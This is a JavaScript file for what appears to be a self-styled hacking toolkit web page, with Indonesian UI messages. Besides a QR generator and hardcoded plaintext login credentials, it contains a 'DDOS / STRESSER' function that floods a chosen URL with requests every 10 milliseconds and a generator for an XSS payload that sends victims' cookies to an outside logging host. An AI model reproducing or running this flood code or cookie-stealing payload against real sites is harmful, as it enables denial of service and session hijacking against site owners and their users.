// 1. AUTH SYSTEM
function terminalAuth() {
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    if (u === "zamxs" && p === "bokep") {
        document.getElementById('login-overlay').classList.add('hidden');
        document.getElementById('app').classList.remove('hidden');
    } else { alert("ACCESS DENIED"); }
}

// 2. REAL QR GEN
function makeQR() {
    const container = document.getElementById("qrcode");
    const text = document.getElementById("qr-input").value;
    container.innerHTML = "";
    if (!text) return alert("Isi teksnya!");
    new QRCode(container, { text: text, width: 180, height: 180 });
}

// 3. MEDIA DOWNLOADER (REDIRECT API)
function fetchMedia() {
    const url = document.getElementById('dl-url').value;
    if(!url) return alert("Link kosong!");
    window.open(`https://cobalt.tools/`, '_blank'); // Cobalt is the best cleaner API right now
}

// 4. DDOS / STRESSER
let floodInterval;
function startFlood() {
    const target = document.getElementById('target-ddos').value;
    if(!target) return;
    document.getElementById('flood-status').innerText = "ATTACKING...";
    floodInterval = setInterval(() => {
        fetch(target, { mode: 'no-cors' }).catch(() => {});
    }, 10);
}
function stopFlood() {
    clearInterval(floodInterval);
    document.getElementById('flood-status').innerText = "STOPPED.";
}

// 5. SOURCE SNIFFER
async function sniffSource() {
    const url = document.getElementById('target-url').value;
    if(!url) return;
    try {
        const res = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
        const data = await res.json();
        const blob = new Blob([data.contents], { type: 'text/html' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = "stolen_source.html";
        a.click();
    } catch (e) { alert("CORS Blocked!"); }
}

// 6. XSS & TRAP
function generateXSS() {
    document.getElementById('xss-output').value = `<script>document.location='http://zamxs-hub.com/log?c='+document.cookie;</script>`;
}
function generateTrap() {
    const link = window.location.href + "?trace=true";
    document.getElementById('trap-link').innerText = "Trap: " + link;
}
